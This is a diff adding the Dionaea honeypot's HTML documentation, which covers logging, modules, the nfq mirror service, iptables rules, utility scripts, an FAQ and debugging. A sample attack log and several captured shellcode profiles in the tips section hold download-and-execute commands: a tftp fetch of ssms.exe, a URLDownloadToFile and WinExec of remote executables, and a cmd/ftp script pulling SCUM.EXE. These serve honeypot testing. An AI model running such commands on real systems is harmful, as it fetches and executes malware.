+/opt/dionaea/var/log/dionaea*.log {
+        notifempty
+        missingok
+        rotate 28
+        daily
+        delaycompress
+        compress
+        create 660 root root
+        dateext
+        postrotate
+                kill -HUP `cat /opt/dionaea/var/run/dionaea.pid`
+        endscript
+}
+</pre><i>/etc/logrotate.d/dionaea</i><br />
+      </div><kbd>processors</kbd> control the actions done on the
+      bi-directional streams we gain when getting attacked, the
+      default is running the emu processor on them to detect
+      shellcode.<br />
+      <kbd>downloads</kbd> specify where to store downloaded
+      malware.<br />
+      <kbd>bistreams</kbd> specify where to store bi-directional
+      streams, these are pretty useful when debugging, as they
+      allow to replay an attack on ip-level, without messing with
+      pcap&amp;tcpreplay, which never worked for me.<br />
+      <kbd>submit</kbd> specifies where to send files to via http
+      or ftp, you can define a new section within submit if you
+      want to add your own service.<br />
+      <kbd>listen</kbd> sets the addresses dionaea will listen to.
+      The default is <strong>all</strong> addresses it can find,
+      this mode is call getifaddrs, but you can set it to manual
+      and specify a single address if you want to limit it.<br />
+      <kbd>modules</kbd> is the most powerfull section, as it
+      specifies the modules to load, and the options for each
+      module.<br />
+      The subsections name is the name of the module dionaea will
+      try to load, most modules got rather simplistic names, the
+      pcap module will use libpcap, the curl module libcurl, the
+      emu module libemu ...<br />
+      The <kbd>python</kbd> module is special, as the python module
+      can load python scripts, which offer services, and each
+      services can have its own options.<br />
+      <br />
+    </div>
+
+    <h3>modules</h3>
+
+    <div class="level3"></div>
+
+    <h4>pcap</h4>
+
+    <div class="level4">
+      The pcap module uses the libpcap library to detect rejected
+      connection attempts, so even if we do not accept a
+      connection, we can use the information somebody wanted to
+      connect there.
+    </div>
+
+    <h4>curl</h4>
+
+    <div class="level4">
+      The curl module is used to transfer files from and to
+      servers, it is used to download files via http as well as
+      submitting files to 3rd parties
+    </div>
+
+    <h4>emu</h4>
+
+    <div class="level4">
+      The emu module is used to detect, profile and - if required -
+      execute shellcode.
+    </div>
+
+    <h4>python</h4>
+
+    <div class="level4">
+      The python module allows using the python interpreter in
+      dionaea, and allows controlling some scripts dionaea uses
+    </div>
+
+    <h5 id="logsql"><a href="#logsql">logsql</a></h5>
+
+    <div class="level5">
+      This section controls the logging to the sqlite
+      database.<br />
+      logsql does not work when chrooting - python makes the path
+      absolute and fails for requests after chroot().<br />
+      <br />
+      logsql requires the directory where the logsql.sqlite file
+      resides to be writeable by the user, as well as the
+      logsql.sqlite file itself.<br />
+      So, if you drop user privs, make sure the user you drop to is
+      allowed to read/write the file and the directory.<br />
+      <pre>
+chown MYUSER:MYGROUP /opt/dionaea/var/dionaea -R
+</pre><br />
+      <br />
+      To query the logsql database, I recommend looking at the
+      <a href="#readlogsqltree">readlogsqltree.py</a> script, for
+      visualisation the <a href="#gnuplotsql">gnuplotsql</a>
+      script.<br />
+      <br />
+      The blog on logsql:
+
+      <ul>
+        <li><a href=
+        "http://carnivore.it/2009/11/06/dionaea_sql_logging">2009-11-06
+        dionaea sql logging</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2009/12/08/post_it_yourself">2009-12-08
+        post it yourself</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2009/12/12/sqlite_performance">2009-12-12
+        sqlite performance</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2009/12/14/virustotal_fun">2009-12-14
+        virustotal fun</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2009/12/15/paris_mission_pack_avs">2009-12-15
+        paris mission pack avs</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2010/06/06/data_visualisation">2010-06-06
+        data visualisation</a></li>
+      </ul>
+    </div>
+
+    <h5 id="logxmpp"><a href="#logxmpp">logxmpp</a></h5>
+
+    <div class="level5">
+      This section controls the logging to xmpp services. If you
+      want to use logxmpp, make sure to enable logxmpp in the ihandler
+      section.<br />
+      Using logxmpp allows you to share your new collected files
+      with other sensors anonymously.<br />
+      <br />
+      The blog on logxmpp:
+
+      <ul>
+        <li><a href=
+        "http://carnivore.it/2010/02/10/xmpp_backend">2010-02-10
+        xmpp backend</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2010/05/12/xmpp_-_take_2">2010-05-12
+        xmpp take #2</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2010/05/15/xmpp_-_take_3">2010-05-15
+        xmpp take #3</a></li>
+      </ul><a href="#pg_backend">pg_backend</a> can be used as a
+      backend for xmpp logging sensors.
+    </div>
+
+    <h5>p0f</h5>
+
+    <div class="level5">
+      Not enabled by default, but recommend: the p0f service,
+      enable by uncommenting p0f in the ihandlers section of the
+      python modules section, and start p0f as suggested in the
+      config. It costs nothing, and gives some pretty cool, even if
+      outdated, informations about the attackers operating system,
+      and you can look them up from the sqlite database, even the
+      rejected connections.<br />
+      If you face problems, <a href=
+      "http://blog.infosanity.co.uk/2010/12/04/dionaea-with-p0f/">here</a>
+      are some hints.
+    </div><br />
+
+    <h5 id="nfq_python"><a href="#nfq_python">nfq</a></h5>
+
+    <div class="level5">
+      The python nfq script is the counterpart to the nfq module.
+      While the nfq module interacts with the kernel, the nfq
+      python script takes care of the required steps to start a new
+      service on the ports.<br />
+      nfq can intercept incoming tcp connections during the tcp
+      handshake giving your honeypot the possibility to provide
+      service on ports which are not served by default.<br />
+      <br />
+      As dionaea can not predict which protocol will be spoken on
+      unknown ports, neither implement the protocol by itself, it
+      will connect the attacking host on the same port, and use the
+      attackers server side protocol implementation to reply to the
+      client requests of the attacker therefore dionaea can end up
+      re?exploiting the attackers machine, just by sending him the
+      exploit he sent us.<br />
+      <br />
+      The technique is a brainchild of Tillmann Werner, who used it
+      within his <a href=
+      "http://honeytrap.carnivore.it">honeytrap</a> honeypot.<br />
+      Legal boundaries to such behaviour may be different in each
+      country, as well as ethical boundaries for each individual.
+      From a technical point of view it works, and gives good
+      results.<br />
+      Learning from the best, I decided to adopt this technique for
+      dionaea.<br />
+      Besides the legal and ethical issues with this approach,
+      there are some technical things which have to be mentioned
+
+      <ul>
+        <li>
+          <strong><em>port scanning</em></strong><br />
+          If your honeypot gets port scanned, it would open a
+          service for each port scanned, in worst case you'd end up
+          with offering 64k services per ip scanned. By default
+          you'd run out of fds at about 870 services offerd, and
+          experience weird behaviour. Therefore the impact of port
+          scanning has to be limited.<br />
+          The kiss approach taken here is a sliding window of
+          <strong>throttle.window</strong> seconds size. Each slot
+          in this sliding window represents a second, and we
+          increment this slot for each connection we accept.<br />
+          Before we accept a connection, we check if the sum of all
+          slots is below <strong>throttle.limits.total</strong>,
+          else we do not create a new service.<br />
+          If the sum is below the limit, we check if the current
+          slot is below the slot limit too, if both are given, we
+          create a new service.<br />
+          If one of the condition fails, we do not spawn a new
+          service, and let nfqeueu process the packet. There are
+          two ways to process packets which got throttled:
+
+          <ul>
+            <li><strong>NF_ACCEPT</strong> (=1), which will let the
+            packet pass the kernel, and as there is no service
+            listening, the packet gets rejected.</li>
+
+            <li><strong>NF_DROP</strong> (=0), which will drop the
+            packet in the kernel, the remote does not get any
+            answer to his SYN.</li>
+          </ul><br />
+          I prefer NF_DROP, as port scanners such as nmap tend to
+          limit their scanning speed, once they notice packets get
+          lost.<br />
+          <br />
+        </li>
+
+        <li>
+          <strong><em>recursive-self-connecting</em></strong><br />
+          Assume some shellcode or download instructions makes
+          dionaea to
+
+          <ul>
+            <li>connect itself on a unbound port</li>
+
+            <li>nfq intercepts the attempt</li>
+
+            <li>spawns a service</li>
+
+            <li>accepts the connection #1</li>
+
+            <li>creates mirror connection for connection #1<br />
+            by connecting the remotehost (itself) on the same port
+            #2</li>
+
+            <li>accepts connection #2 as connection #3</li>
+
+            <li>creates mirror connection for connection #3<br />
+            by connecting the remotehost (itself) on the same port
+            #4</li>
+
+            <li>....</li>
+
+            <li>....</li>
+          </ul>Such recursive loop, has to be avoided for obvious
+          reasons.<br />
+          Therefore dionaea checks if the remote host connecting a
+          nfq mirror is a local address using 'getifaddrs' and
+          drops local connections.<br />
+        </li>
+      </ul>So much about the known problems and workarounds
+      ...<br />
+      If you read that far, you want to use it despite the
+      technical/legal/ethical problems.<br />
+      So ... You'll need iptables, and you'll have to tell iptables
+      to enqueue packets which would establish a new
+      connection.<br />
+      I recommend something like this:<br />
+      <pre>
+iptables -t mangle -A PREROUTING -i eth0 -p tcp -m socket -j ACCEPT
+iptables -t mangle -A PREROUTING -i eth0 -p tcp --syn -m state --state NEW -j NFQUEUE --queue-num 5
+</pre>Explanation:<br />
+
+      <ol>
+        <li>ACCEPT all connections to existing services</li>
+
+        <li>enqueue all other packets to the NFQUEUE</li>
+      </ol><br />
+      If you have dionaea running on your NAT router, I recommend
+      something like:
+      <pre>
+iptables -t mangle -A PREROUTING -i ppp0 -p tcp -m socket -j ACCEPT
+iptables -t mangle -A PREROUTING -i ppp0 -p tcp --syn -m state --state NEW -j MARK --set-mark 0x1
+iptables -A INPUT -i ppp0 -m mark --mark 0x1 -j NFQUEUE
+</pre>Explanation:<br />
+
+      <ol>
+        <li>ACCEPT all connections to existing services in
+        mangle::PREROUTING</li>
+
+        <li>MARK all other packets</li>
+
+        <li>if we see these marked packets on INPUT, queue
+        them</li>
+      </ol><br />
+      Using something like:
+      <pre>
+
+iptables -A INPUT -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j NFQUEUE --queue-num 5
+
+</pre>will enqueue <em>all</em> SYN packets to the NFQUEUE, once
+you stop dionaea you will not even be able to connect to your ssh
+daemon.<br />
+      <br />
+      Even if you add an exemption for ssh like:
+      <pre>
+
+iptables -A INPUT -i eth0 -p tcp --syn -m state --state NEW --destination-port ! 22 -j NFQUEUE
+
+</pre>dionaea will try to create a new service for <em>every</em>
+incoming connection, even if there is a service running
+already.<br />
+      As it is easy to avoid this, I recommend sticking with the
+      recommendation.<br />
+      Besides the already mention throttle settings, there are
+      various timeouts for the nfq mirror service in the
+      config.<br />
+      You can control how long the service will wait for new
+      connections (<em>timeouts.server.listen</em>), and how long
+      the mirror connection will be idle
+      (<em>timeouts.client.idle</em>) and sustain
+      (<em>timeouts.client.sustain</em>).
+    </div><br />
+
+    <h5>ihandlers</h5>
+
+    <div class="level5">
+      <kbd>ihandlers</kbd> section is used to specify which
+      ihandlers get started by ihandlers.py . You do not want to
+      miss p0f and logsql.
+    </div>
+
+    <h5>services</h5>
+
+    <div class="level5">
+      <kbd>services</kbd> controls which services will get started
+      by services.py
+    </div>
+
+    <h2 id="utils">Utils</h2>
+
+    <div class="level2">
+      Dionaea ships with some utils, as these utils are written in
+      python and rely on the python3 interpreter dionaea requires
+      to operate, this software can be found in
+      modules/python/utils.
+    </div>
+
+    <h5 id="readlogsqltree"><a href=
+    "#readlogsqltree">readlogsqltree</a> -
+    modules/python/readlogsqltree.py</h5>
+
+    <div class="level5">
+      readlogsqltree is a python3 script which queries the logsql
+      sqlite database for attacks, and prints out all related
+      information for every attack.<br />
+      This is an example for an attack, you get the vulnerability
+      exploited, the time, the attacker, information about the
+      shellcode, the file offered for download, and even the
+      virustotal report for the file.
+      <pre>
+2010-10-07 20:37:27
+  connection 483256 smbd tcp accept 10.0.1.11:445 &lt;- 93.177.176.190:47650 (483256 None)
+   dcerpc bind: uuid '4b324fc8-1670-01d3-1278-5a47bf6ee188' (SRVSVC) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid '7d705026-884d-af82-7b3d-961deaeb179a' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid '7f4fdfe9-2be7-4d6b-a5d4-aa3c831503a1' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid '8b52c8fd-cc85-3a74-8b15-29e030cdac16' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid '9acbde5b-25e1-7283-1f10-a3a292e73676' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid '9f7e2197-9e40-bec9-d7eb-a4b0f137fe95' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid 'a71e0ebe-6154-e021-9104-5ae423e682d0' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid 'b3332384-081f-0e95-2c4a-302cc3080783' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid 'c0cdf474-2d09-f37f-beb8-73350c065268' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid 'd89a50ad-b919-f35c-1c99-4153ad1e6075' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc bind: uuid 'ea256ce5-8ae1-c21b-4a17-568829eec306' (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860
+   dcerpc request: uuid '4b324fc8-1670-01d3-1278-5a47bf6ee188' (SRVSVC) opnum 31 (NetPathCanonicalize (MS08-67))
+   profile: [{'return': '0x7df20000', 'args': ['urlmon'], 'call': 'LoadLibraryA'}, {'return': '0', 'args': ['', 'http://208.53.183.158/m.exe', '60.exe', '0', '0'], 'call': 'URLDownloadToFile'}, {'return': '32', 'args': ['60.exe', '895'], 'call': 'WinExec'}, {'return': '0', 'args': ['-1'], 'call': 'Sleep'}]
+   offer: http://208.53.183.158/m.exe
+   download: 3eab379ddac7d80d3e38399fd273ddd4 http://208.53.183.158/m.exe
+     virustotal 2010-10-07 04:59:07 5/38 (13%) http://www.virustotal.com/file-scan/report.html?id=265e39edcba9d9004451601544e625f2d3d04f837d0aaf1f8464cb2c819c1939-1286420347
+       names 'High Risk Fraudulent Security Program' 'Suspicious file' 'Trojan.DownLoader1.27100' 'Worm.Win32.Rimecud' 'Worm:Win32/Rimecud.B'
+</pre><br />
+      To create such report for your own honeypots activities for
+      the last 24 hours run:
+      <pre>
+
+./readlogsqltree.py  -t $(date '+%s')-24*3600 /opt/dionaea/var/dionaea/logsql.sqlite
+
+</pre>
+    </div>
+
+    <h5 id="gnuplotsql"><a href="#gnuplotsql">gnuplotsql</a> -
+    modules/python/gnuplotsql.py</h5>
+
+    <div class="level5">
+      gnuplotsql is a very slow python3 script which runs some
+      queries on the <a href="#logsql">logsql</a> sqlite database
+      and creates graphs with gnuplot of the data, stores them on
+      disk and creates an index of the data. The images are per
+      protocol and look like this: <img src=
+      "gnuplotsql/dionaea-overview-smbd.png" alt=
+      "Overview for dionaea smbd" />.<br />
+      <a href="gnuplotsql">Here</a> is how the whole thing looks
+      like.<br />
+      To create such images of your own data, run:
+      <pre>
+
+./gnuplotsql.py -d /opt/dionaea/var/dionaea/logsql.sqlite -p smbd -p epmapper -p mssqld -p httpd -p ftpd
+
+</pre>The blog got something on gnuplotsql as well:
+
+      <ul>
+        <li><a href=
+        "http://carnivore.it/2010/12/05/sudden_death">2010-12-05
+        sudden death</a></li>
+
+        <li><a href=
+        "http://blog.infosanity.co.uk/2010/10/01/gnuplotsql-py/">2010-10-01
+        Infosanity's Blog: gnuplotsql.py</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2010/09/19/gnuplotsql">2010-09-19
+        gnuplotsql</a></li>
+      </ul>
+    </div>
+
+    <h5 id="pg_backend"><a href="#pg_backend">pg_backend</a> -
+    modules/python/xmpp/pg_backend.py</h5>
+
+    <div class="level5">
+      pg_backend is the backend for <a href="#logxmpp">logxmpp</a>,
+      currently it is a python2.x script which uses pyxmpp to
+      access the xmpp service. It parses the messages received and
+      can store the events in a postgres database and the received
+      files on disk. pg_backend requires an xmpp account.<br />
+      <em>without db</em>
+      <pre>
+
+./pg_backend.py -U USER@sensors.carnivore.it -P XMPPPASS -M dionaea.sensors.carnivore.it -C anon-files -C anon-events -f /tmp/
+
+</pre><br />
+      <em>with db</em> create database
+      <pre>
+psql ...
+</pre>start backend
+      <pre>
+
+./pg_backend.py -U USER@sensors.carnivore.it -P XMPPPASS -M dionaea.sensors.carnivore.it -C anon-files -C anon-events -s DBHOST -u DBUSER -d xmpp -p DBPASS -f /tmp/
+
+</pre>
+    </div>
+
+    <h2 id="FAQ"><a href="#FAQ">FAQ</a></h2>
+
+    <dl class="faq">
+      <dt>I get <kbd>gcc: command not found</kbd>?</dt>
+
+      <dd>install gcc..</dd>
+
+      <dt>How to uninstall it?</dt>
+
+      <dd>rm -rf /opt/dionaea</dd>
+
+      <dt>I get <kbd>binding.pyx:...: undeclared name not builtin:
+      bytes</kbd> during the python modules build</dt>
+
+      <dd>Install a recent cython version</dd>
+
+      <dt>I get <kbd>Python.h not found</kbd> during compiling
+      cython</dt>
+
+      <dd>Install appropriate headers for your python
+      interpreter</dd>
+
+      <dt>I get <kbd>OperationalError at unable to open database
+      file</kbd> when using logsqlite and it does not work at
+      all</dt>
+
+      <dd>Read the <a href="#logsql">logsql instructions</a></dd>
+
+      <dt>I get a <kbd>Segmentation Fault</kbd></dt>
+
+      <dd>Read the <a href="#segfault">segfault
+      instructions</a></dd>
+
+      <dt>I logrotate, and <kbd>after logrotate dionaea does not
+      log anymore</kbd>.</dt>
+
+      <dd>Read the <a href="#logging">logrotate
+      instructions</a></dd>
+
+      <dt>I <kbd>do not use ubuntu/debian</kbd> and the
+      instructions are useless for me therefore.</dt>
+
+      <dd>I use debian/ubuntu, and therefore I can only provide
+      instructions for debian/ubuntu, but you are free to <kbd>send
+      me a diff for your operating system</kbd></dd>
+
+      <dt><kbd>p0f does not work</kbd>.</dt>
+
+      <dd>Make sure your have p0f 2.0.8 and dionaea does not listen
+      on ::, p0f can't deal with IPv6.</dd>
+
+      <dt>I'm facing a bug, <kbd>it fails, and I can't figure out
+      why</kbd> .</dt>
+
+      <dd>Explain the problem, if I'm interested in the nature of
+      the problem, as it does not sound like pebcak, I may ask for
+      a shell/screen and have a look myself, and if it is worth it,
+      you'll even get a FAQ entry for some specialties of your
+      OS.</dd>
+
+      <dt>I use <kbd>Redhat/Centos 5</kbd> and the installation is
+      frustrating and a mess as nothing works.</dt>
+
+      <dd>Thats right, but I did not choose your operating
+      system.<br />
+      Here is a list of outdated or missing packages for your
+      choosen distribution: <strong>all</strong>. Yes, you'll even
+      have to install glib (you'll have 2.10 where 2.20 is
+      required) from source.<br />
+      Getting python3 compiled with a recent sqlite3 version
+      installed to /opt/dionaea requires editing the setup.py file
+      (<a href="http://p.carnivore.it/KDIFWt">patch</a>).<br />
+      <em>I experienced this wonderful operating system myself ...
+      You really have to love your distro to stick with it, even if
+      it ships software versions your grandma saw released in her
+      youth.<br />
+      <strong>Centos is the best distro ... to change
+      distros</strong>.<br />
+      No matter what you choose, it can't get worse.</em></dd>
+    </dl>
+
+    <h2 id="tricks">Tips and Tricks</h2>
+
+    <div class="level2">
+      dionaea embedds a python interpreter, and can offer a python
+      cli therefore too.<br />
+      <strong>The python cli is blocking</strong>, if you start
+      entering a command, the whole process will wait for you to
+      finish it, and not accept any new connections.<br />
+      You can use the python cli to interact with dionaea, which is
+      very useful for development and debugging.
+
+      <h3>Configuration</h3>
+
+      <div class="level3">
+        You can access the dionaea.conf via python (readonly)
+      </div>
+      <pre>
+from dionaea import g_dionaea
+g_dionaea.config()
+</pre>
+
+      <h3>Completition and History on the CLI</h3>
+
+      <div class="level3">
+        If you use the cli often, you can make it behave like a
+        real shell, including history and completition.
+      </div>
+      <pre>
+import rlcompleter, readline
+readline.parse_and_bind('tab: complete')
+</pre>
+
+      <h3>Triggering Downloads</h3>
+
+      <div class="level3">
+        Sometimes it helps to trigger a download, without waiting
+        for an attack. Very useful if you want to verify
+        permissions are correct when switching the user, or making
+        sure a submission to a 3rd party works correctly.<br />
+        You can trigger downloads for all major protocols.
+      </div>
+
+      <h4>ftp</h4>
+      <pre>
+from dionaea.ftp import ftp
+f = ftp()
+f.download(None, 'anonymous','guest','ftp.kernel.org',21, 'welcome.msg', 'binary','ftp://ftp.kernel.org/welcome.msg')
+</pre>
+
+      <h4>tftp</h4>
+      <pre>
+from dionaea.tftp import TftpClient
+t = TftpClient()
+t.download(None, 'tftp.example.com', 69, 'filename')
+</pre>
+
+      <h4>http</h4>
+
+      <div class="level4">
+        As the http download is not done in python, we do not use
+        the download facility directly, but create an incident,
+        which will trigger the download
+        <pre>
+from dionaea.core import incident
+i = incident("dionaea.download.offer")
+i.set("url", "http://www.honeynet.org")
+i.report()
+
+</pre>
+      </div>
+
+      <h3>incidents</h3>
+
+      <div class="level3">
+        incidents are the ipc used in dionaea.
+
+        <h4>dumping</h4>
+        <pre>
+from dionaea.core import ihandler
+class idumper(ihandler):
+        def __init__(self, pattern):
+                ihandler.__init__(self, pattern)
+        def handle(self, icd):
+                icd.dump()
+
+a = idumper('*')
+</pre>
+      </div>
+
+      <h4>emu profile</h4>
+
+      <div class="level4">
+        Small collection of various shellcode profiles gatherd from
+        dionaea.
+      </div>
+
+      <h5>CreateProcess Commands</h5>
+
+      <div class="level5">
+        This profile will trigger a download via tftp.
+        <pre>
+p='[{"call": "CreateProcess", "args": ["", "tftp.exe -i 92.17.46.208 get ssms.exe", "", "", "1", "40", "", "", {"dwXCountChars": "0", "dwFillAttribute": "0", "hStdInput": "0", "dwYCountChars": "0", "cbReserved2": "0", "cb": "0", "dwX": "0", "dwY": "0", "dwXSize": "0", "lpDesktop": "0", "hStdError": "68", "dwFlags": "0", "lpReserved": "0", "lpReserved2": "0", "hStdOutput": "0", "lpTitle": "0", "dwYSize": "0", "wShowWindow": "0"}, {"dwProcessId": "4712", "hProcess": "4711", "dwThreadId": "4714", "hThread": "4712"}], "return": "-1"}, {"call": "CreateProcess", "args": ["", "ssms.exe", "", "", "1", "40", "", "", {"dwXCountChars": "0", "dwFillAttribute": "0", "hStdInput": "0", "dwYCountChars": "0", "cbReserved2": "0", "cb": "0", "dwX": "0", "dwY": "0", "dwXSize": "0", "lpDesktop": "0", "hStdError": "68", "dwFlags": "0", "lpReserved": "0", "lpReserved2": "0", "hStdOutput": "0", "lpTitle": "0", "dwYSize": "0", "wShowWindow": "0"}, {"dwProcessId": "4712", "hProcess": "4711", "dwThreadId": "4714", "hThread": "4712"}], "return": "-1"}, {"call": "ExitThread", "args": ["0"], "return": "0"}]'
+from dionaea.core import incident
+i = incident("dionaea.module.emu.profile")
+i.set("profile", str(p))
+i.report()
+</pre>
+      </div>
+
+      <h5>URLDownloadToFile</h5>
+
+      <div class="level5">
+        This profile will trigger a download.
+        <pre>
+p='[{"call": "LoadLibraryA", "args": ["urlmon"], "return": "0x7df20000"}, {"call": "URLDownloadToFile", "args": ["", "http://82.165.32.34/compiled.exe", "47.scr", "0", "0"], "return": "0"}, {"call": "WinExec", "args": ["47.scr", "895"], "return": "32"}]'
+from dionaea.core import incident
+i = incident("dionaea.module.emu.profile")
+i.set("profile", str(p))
+i.report()
+</pre>
+      </div>
+
+      <h5>WinExec Commands</h5>
+
+      <div class="level5">
+        This profile uses WinExec to create a command file for
+        windows ftp client, downloads a file, and executes the
+        file.
+        <pre>
+p='[{"call": "WinExec", "args": ["cmd /c echo open welovewarez.com 21 &gt; i&amp;echo user wat l0l1 &gt;&gt; i &amp;echo get SCUM.EXE &gt;&gt; i &amp;echo quit &gt;&gt; i &amp;ftp -n -s:i &amp;SCUM.EXE\\r\\n", "0"], "return": "32"}, {"call": "ExitThread", "args": ["0"], "return": "0"}]'
+from dionaea.core import incident
+i = incident("dionaea.module.emu.profile")
+i.set("profile", str(p))
+i.report()
+</pre>
+      </div>
+    </div>
+
+    <h2 id="segfault">Segfault</h2>
+
+    <div class="level2">
+      In case you experience a segfault, you will see something
+      like this:
+      <pre>
+This is the end.
+This software just had a segmentation fault.
+The bug you encountered may even be exploitable.
+If you want to assist in fixing the bug, please send the backtrace below to nepenthesdev@gmail.com.
+You can create better backtraces with gdb, for more information visit http://dionaea.carnivore.it/#segfault
+Once you read this message, your tty may be broken, simply type reset, so it will come to life again
+
+/opt/dionaea/bin/dionaea(sigsegv_backtrace_cb+0x20)[0x805c11e]
+[0x70d420]
+/opt/dionaea/lib/libemu/libemu.so.2(emu_env_w32_eip_check+0x94)[0x186974]
+/opt/dionaea/lib/dionaea/emu.so(run+0x39)[0x89cced]
+/opt/dionaea/lib/dionaea/emu.so(profile+0xbb)[0x89db88]
+/opt/dionaea/lib/dionaea/emu.so(proc_emu_on_io_in+0x1e1)[0x89bfc5]
+/opt/dionaea/bin/dionaea(recurse_io_process+0x31)[0x805df4a]
+/opt/dionaea/bin/dionaea(processors_io_in_thread+0x85)[0x805e08d]
+/opt/dionaea/bin/dionaea(threadpool_wrapper+0x2e)[0x805c99a]
+/opt/dionaea/lib/libglib-2.0.so.0[0xaa9498]
+/opt/dionaea/lib/libglib-2.0.so.0[0xaa7a2f]
+/lib/libpthread.so.0[0xd8973b]
+/lib/libc.so.6(clone+0x5e)[0x2b3cfe]
+</pre>While the backtrace itself gives an idea what might be wrong,
+it does not fix the problem. To fix the problem, the logfiles
+usually help, as dionaea is very verbose by default. Below are some
+hints how to get started with debugging, click <a href="#support">
+      here</a> for assistance.
+
+      <h3 id="debug">debugging</h3>
+
+      <h4 id="valgrind">Valgrind</h4>
+
+      <div class="level4">
+        Valgrind does a great job, here is how I use it:
+        <pre>
+valgrind -v --leak-check=full --leak-resolution=high --show-reachable=yes \
+--log-file=dionaea-debug.log /opt/dionaea/bin/dionaea --my-dionaea-options
+</pre>
+      </div>
+
+      <h4 id="gdb">gdb</h4>
+
+      <h5 id="gdb">logfile assisted</h5>
+
+      <div class="level5">
+        For the above example, I was able to scrape the shellcode
+        from the logfile, and run it in libemu, without involving
+        dionaea at all, reducing the problem.
+        <pre>
+gdb /opt/dionaea/bin/sctest
+(gdb) run -S -s 10000000 -g &lt; sc.bin
+Starting program: /media/sda4/opt64/dionaea/bin/sctest -S -s 10000000 -g &lt; sc.bin
+</pre>Once it crashed, I retrieved a full backtrace:
+        <pre>
+Program received signal SIGSEGV, Segmentation fault.
+env_w32_hook_GetProcAddress (env=0x629a30, hook=&lt;value optimized out&gt;) at environment/win32/env_w32_dll_export_kernel32_hooks.c:545
+545                             struct emu_env_hook *hook = (struct emu_env_hook *)ehi-&gt;value;
+
+(gdb) bt full
+#0  env_w32_hook_GetProcAddress (env=0x629a30, hook=&lt;value optimized out&gt;) at environment/win32/env_w32_dll_export_kernel32_hooks.c:545
+        dll = 0x6366f0
+        ehi = &lt;value optimized out&gt;
+        hook = &lt;value optimized out&gt;
+        c = 0x611180
+        mem = &lt;value optimized out&gt;
+        eip_save = &lt;value optimized out&gt;
+        module = 2088763392
+        p_procname = 4289925
+        procname = &lt;value optimized out&gt;
+#1  0x00007ffff7b884fb in emu_env_w32_eip_check (env=0x629a30) at environment/win32/emu_env_w32.c:306
+        dll = &lt;value optimized out&gt;
+        ehi = &lt;value optimized out&gt;
+        hook = 0x64c5b0
+        eip = &lt;value optimized out&gt;
+#2  0x0000000000403995 in test (e=0x60f0e0) at sctestmain.c:277
+        hook = 0xe2
+        ev = 0x0
+        iv = &lt;value optimized out&gt;
+        cpu = 0x611180
+        mem = &lt;value optimized out&gt;
+        env = 0x629a30
+        na = &lt;value optimized out&gt;
+        j = 7169
+        last_vertex = 0x0
+        graph = 0x0
+        eh = 0x0
+        ehi = 0x0
+        ret = &lt;value optimized out&gt;
+        eipsave = 2088807840
+#3  0x00000000004044e4 in main (argc=5, argv=0x7fffffffe388) at sctestmain.c:971
+        e = &lt;value optimized out&gt;
+</pre>In this case, the problem was a bug in libemu.<br />
+      </div>
+
+      <h5 id="gdb">gdb dump memory</h5>
+
+      <div class="level5">
+        Once again, it broke, and we got a backtrace:
+        <pre>
+#0  0xb70b0b57 in emu_queue_enqueue (eq=0xb3da0918, data=0x4724ab) at emu_queue.c:63
+        eqi = (struct emu_queue_item *) 0x0
+#1  0xb70b15d1 in emu_shellcode_run_and_track (e=0xb4109cd0, data=0xb411c698 "", datasize=&lt;value optimized out&gt;, eipoffset=&lt;value optimized out&gt;,
+    steps=256, etas=0xb410cd60, known_positions=0xb3d7a810, stats_tested_positions_list=0xb3da3bf0, brute_force=true) at emu_shellcode.c:408
+        current_pos_ti_diff = (struct emu_tracking_info *) 0x88c3c88
+        current_pos_ht = &lt;value optimized out&gt;
+        current_pos_v = &lt;value optimized out&gt;
+        current_pos_satii = (struct emu_source_and_track_instr_info *) 0xb407e7f8
+        bfs_queue = (struct emu_queue *) 0xb3e17668
+        ret = 4662443
+        eipsave = &lt;value optimized out&gt;
+        hook = &lt;value optimized out&gt;
+        j = 4
+        es = &lt;value optimized out&gt;
+        eli = (struct emu_list_item *) 0xb3e17658
+        cpu = (struct emu_cpu *) 0xb4109ab0
+        mem = (struct emu_memory *) 0xb410c3a0
+        eq = (struct emu_queue *) 0xb3da0918
+        env = (struct emu_env *) 0xb3e10208
+        eli = (struct emu_list_item *) 0x4724ab
+#2  0xb70b1a2a in emu_shellcode_test (e=0xb4109cd0, data=0xb411c698 "", size=&lt;value optimized out&gt;) at emu_shellcode.c:546
+        es = (struct emu_stats *) 0xb3d92b28
+        new_results = (struct emu_list_root *) 0xb3da3bf0
+        offset = &lt;value optimized out&gt;
+        el = (struct emu_list_root *) 0xb4100510
+        etas = (struct emu_track_and_source *) 0xb410cd60
+        eh = (struct emu_hashtable *) 0xb3d7a810
+        eli = (struct emu_list_item *) 0xb3d92b40
+        results = (struct emu_list_root *) 0xb3d82850
+        es = &lt;value optimized out&gt;
+        __PRETTY_FUNCTION__ = "emu_shellcode_test"
+#3  0xb712140c in proc_emu_on_io_in (con=0x8864b58, pd=0x87dc388) at detect.c:145
+        e = (struct emu *) 0xb4109cd0
+        ctx = (struct emu_ctx *) 0x87a2400
+        offset = 14356
+        streamdata = (void *) 0xb411c698
+        size = 8196
+        ret = 0
+        __PRETTY_FUNCTION__ = "proc_emu_on_io_in"
